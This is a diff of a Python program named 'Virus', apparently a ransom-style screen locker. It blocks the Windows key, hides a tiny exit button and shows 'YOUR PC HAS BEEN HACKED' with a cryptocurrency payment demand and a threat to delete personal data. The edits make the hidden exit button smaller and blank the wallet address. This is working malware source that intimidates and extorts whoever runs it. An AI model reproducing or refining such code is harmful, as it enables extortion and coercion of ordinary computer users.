@@ -48,7 +48,7 @@ class Virus:
         self.label2.place(x=30, y=290, width=1300, height=70)
 
         self.boton.config(bg='black', command=self.destruir)
-        self.boton.place(x=609, y=229, width=5, height=5)
+        self.boton.place(x=609, y=229, width=4, height=4)
 
         self.root.mainloop()
 
@@ -57,7 +57,7 @@ class Virus:
 
         self.root.withdraw()
         keyboard.unblock_key('windows izquierda')
-        time.sleep(5)
+        time.sleep(2)
         self.root.deiconify()
         keyboard.block_key('windows izquierda')
 
@@ -80,7 +80,7 @@ class Virus:
 # frases que se mostraran en la interfas
 frase = "YOUR PC HAS BEEN HACKED"
 frase_2 = "IF YOU WANT YOUR PC AGAIN, SEND ME CRYPTOCURRENCY TO THIS ACOUNT" \
-          ": >>>KJFH242SIA333GIFGSDD232FGSIFGSYF.\nDO NOT TURN OFF YOUR PC OR ALL PERSONAL INFORMATIO NWILL BE DELETE"
+          ": >>>.\nDO NOT TURN OFF YOUR PC OR ALL PERSONAL INFORMATIO NWILL BE DELETE"
 
 
 # se instancia la clase de virus y se le pasa como atributo las frases definidas anteriormente
